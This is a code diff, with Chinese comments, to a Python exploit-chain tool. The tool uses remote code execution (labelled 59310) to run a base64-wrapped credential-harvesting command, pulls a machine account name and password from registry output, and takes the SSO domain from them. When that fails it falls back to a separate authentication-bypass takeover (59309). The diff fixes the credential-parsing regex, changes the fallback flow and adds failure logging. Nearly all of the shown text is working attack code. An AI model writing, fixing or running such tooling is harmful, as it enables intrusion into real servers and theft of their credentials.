@@ -25,7 +25,7 @@ from .srp59309 import srp_bypass_bind
 from .syslog59310 import rce_readback
 from .util import rand_name
 
-_LWREG_LINE = re.compile(r'^"[^"]*"\s+REG_SZ\s+"(.*)"\s*$')
+_LWREG_LINE = re.compile(r'"([^"]*)"\s+REG_SZ\s+"(.*)"')
 
 # 经 59310 RCE 执行的凭据收集命令（整体 base64 封装传输，无引号问题）
 MACHINE_CREDS_CMD = (
@@ -36,11 +36,14 @@ MACHINE_CREDS_CMD = (
 
 
 def parse_lwreg_value(line):
-    """解析 lwregshell 输出行并还原转义：\\" → "，\\\\ → \\。"""
-    m = _LWREG_LINE.match(line.strip())
+    """解析 lwregshell 输出行并还原转义：\\" → "，\\\\ → \\。
+
+    实测输出行形如 `+  "dcAccountDN"  REG_SZ  "cn=..."`（带 + 前缀），
+    因此用 search 而非 match，取最后一个带引号值为准。"""
+    m = _LWREG_LINE.search(line.strip())
     if not m:
         return None
-    v = m.group(1)
+    v = m.group(2)
     return v.replace("\\\\", "\x00").replace('\\"', '"').replace("\x00", "\\")
 
 
@@ -137,15 +140,18 @@ def run_chain(host, *, user=None, password=None, use_59310=True, use_59309=True,
                 step("S1 59310 RCE（%s）" % label, False, text)
                 continue
             dn, pw = extract_machine_creds(text)
+            uid = re.search(r"UID=(\d+)", text)
             if dn and pw:
                 step("S2 机器账户提取", True,
                      "%s（密码 %d 字符）" % (dn, len(pw)))
                 domain = domain_from_dn(dn)
                 log("[*] [S2] SSO 域: %s" % domain)
                 break
-            uid = re.search(r"UID=(\d+)", text)
+            # RCE 已生效但凭据缺失 —— 换传输方式也不会变，直接转 59309 降级
             step("S1 59310 RCE（%s）" % label, True,
-                 "root=%s 但凭据输出缺失" % (uid.group(1) == "0" if uid else "?"))
+                 "RCE 生效（uid=%s）但凭据输出缺失 — 转 59309 降级"
+                 % (uid.group(1) if uid else "?"))
+            break
     elif not use_59310:
         step("S1 59310", True, "按配置跳过")
 
@@ -188,6 +194,7 @@ def run_chain(host, *, user=None, password=None, use_59310=True, use_59309=True,
                     step("S3b 59309 接管", True, via)
                     break
                 c.close()
+                log("[!] [S3b] %s:%d 失败: %s" % (host, p, r.msg))
             except Exception as e:
                 log("[!] [S3b] %s:%d 异常: %r" % (host, p, e))
 
